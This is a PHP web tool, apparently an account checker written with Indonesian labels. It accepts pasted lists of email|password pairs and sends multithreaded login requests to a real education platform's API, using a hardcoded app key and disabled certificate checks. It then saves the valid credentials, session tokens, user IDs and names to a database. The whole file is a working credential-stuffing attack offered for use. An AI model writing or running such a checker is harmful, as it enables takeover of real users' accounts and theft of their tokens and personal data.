<?PHP
date_default_timezone_set('Asia/Jakarta');
include_once 'config.php';
?>
<center>
<form method="post" enctype="multipart/form-data">
<h4>Masukkan list EmPass</h4>
<textarea name="input" style="width: 777px; height: 222px;" placeholder="kuchuz@gmail.com|Password"><?=(isset($_POST['input']) && !empty($_POST['input']))?$_POST['input']:'';?></textarea><br/>
<span>Delimiter : <input name="delimiter" value="|"/></span><br/>
<button type=submit>Submit</button>
</form>
<?PHP
if(isset($_POST['input']) && !empty($_POST['input'])){
	echo '<span>Data yang berhasil diinput</span><br/><textarea name="output" style="width: 777px; height: 222px;">';
	$input = $_POST['input'];
	$list = explode("\n",$input);
	$hasil=array();
	/* Local table $hasil
	data: [
		0: email,
		1: password,
		2: status,
		3: token,
		4: id,
		5: name
	]
	*/
	foreach($list as $line){
		if(str_contains($line,$_POST['delimiter'])){
			$data = explode($_POST['delimiter'],trim(preg_replace('/\s\s+/', ' ', $line)));
			$data[0] = strtolower($data[0]);
			$hasil[]=array($data[0],$data[1]);
		}
	}
	/*Get User details from server*/
	$list_ret = getResponseByUrlsMultiThreads($hasil);
	foreach($list_ret as $key=>$data){
		$data = json_decode($data);
		$hasil[$key][2] = $data->status;
		if(isset($data->token) && $data->status==200){
			$hasil[$key][3] = $data->token->token;
			$hasil[$key][4] = $data->data->id;
			$hasil[$key][5] = $data->data->name;
		}else{
			$hasil_rusak[$key]=$hasil[$key];
			unset($hasil[$key]);
		}
	}
	/* Update User with $hasil*/
	foreach($hasil as $key=>$data){
		$stmt = $pdo->prepare("SELECT * FROM user WHERE email=?");
		$stmt->execute([$hasil[$key][0]]);
		$datas = $stmt->fetch();
		if($datas){
			$pdo->prepare("UPDATE user SET id=?,password=?,status=?,token=?,name=? WHERE email=?")->execute([
				$hasil[$key][4],
				$hasil[$key][1],
				0,
				$hasil[$key][3],
				$hasil[$key][5],
				$hasil[$key][0]
			]);
		}else{
			$pdo->prepare("INSERT INTO user (email,password,status,token,id,name) VALUES (?,?,?,?,?,?)")->execute([
				$hasil[$key][0],
				$hasil[$key][1],
				0,
				$hasil[$key][3],
				$hasil[$key][4],
				$hasil[$key][5]
			]);
		}
		echo $hasil[$key][0]."|".$hasil[$key][1]."\n";
	}
	foreach($hasil_rusak as $key=>$data){
		$stmt = $pdo->prepare("SELECT * FROM user WHERE email=?");
		$stmt->execute([$hasil_rusak[$key][0]]);
		$datas = $stmt->fetch();
		if($datas){
			$pdo->prepare("UPDATE user SET password=? WHERE email=?")->execute([
				$hasil_rusak[$key][1],
				$hasil_rusak[$key][0]
			]);
		}else{
			$pdo->prepare("INSERT INTO user (email,password,status) VALUES (?,?)")->execute([
				$hasil_rusak[$key][0],
				$hasil_rusak[$key][1],
				0
			]);
		}
		echo $hasil_rusak[$key][0]."|".$hasil_rusak[$key][1]."\n";
	}
	echo '</textarea>';
}
function getResponseByUrlsMultiThreads($datas, $threads = 10, $followLocation = true, $maxRedirects = 10){
	$curlOptions = [
		CURLOPT_HEADER => false,
		CURLOPT_NOBODY => false,
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
		CURLOPT_ENCODING => '',
		CURLOPT_SSL_VERIFYPEER => false,
		CURLOPT_TIMEOUT => 30,
		CURLOPT_ENCODING => 'gzip'
	];
	if($followLocation){
		$curlOptions[CURLOPT_FOLLOWLOCATION] = true;
		$curlOptions[CURLOPT_MAXREDIRS] = $maxRedirects;
	}
	$mh = curl_multi_init();
	$chArray = [];
	$executeMethod = function ($mh, $chArray, &$result, &$running, &$currentThread){
		while (curl_multi_exec($mh, $running) === CURLM_CALL_MULTI_PERFORM);
		curl_multi_select($mh);
		while ($done = curl_multi_info_read($mh)) {
			foreach ($chArray as $key => $ch) {
				if($ch == $done['handle']){
					$result[$key] = curl_multi_getcontent($ch);
				}
			}
			curl_multi_remove_handle($mh, $done['handle']);
			curl_close($done['handle']);
			$currentThread--;
		}
	};

	$result = [];
	$running = [];
	$currentThread = 0;

	$datas = !is_array($datas) ? [$datas] : $datas;
	foreach($datas as $keys=>$data){
		$ch = curl_init('https://api.sekolah.mu/user/login/?source=web-kariermu&platform=kariermu&source=a2FyaWVyLm11LXdlYg==');
		$curlOptions[CURLOPT_HTTPHEADER] = array('Authorization: Sekolahmu0App0Key0Secret!!!','Content-Length: '.strlen('{"email":"'.$data[0].'","password":"'.$data[1].'","from_webview":true,"source":"web-kariermu"}'),'Content-Type: application/json;charset=utf-8');
		$curlOptions[CURLOPT_POST] = true;
		$curlOptions[CURLOPT_POSTFIELDS] = '{"email":"'.$data[0].'","password":"'.$data[1].'","from_webview":true,"source":"web-kariermu"}';
		curl_setopt_array($ch, $curlOptions);
		$chArray[$keys] = $ch;
		curl_multi_add_handle($mh, $ch);
		$currentThread++;
		if ($currentThread >= $threads) {
			while ($currentThread >= $threads) {
				$executeMethod($mh, $chArray, $result, $running, $currentThread);
			}
		}
	}
	do {
		$executeMethod($mh, $chArray, $result, $running, $currentThread);
	} while($running > 0);
	curl_multi_close($mh);
	return $result;
}